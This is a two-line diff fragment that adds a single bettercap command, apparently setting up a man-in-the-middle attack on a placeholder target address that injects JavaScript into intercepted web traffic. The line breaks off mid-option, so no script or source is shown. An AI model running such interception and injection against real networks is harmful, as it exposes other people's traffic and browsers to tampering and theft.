@@ -1,0 +1,2 @@
+
+bettercap -I eth0 -T X.X.X.X --proxy-module injectjs --js-u
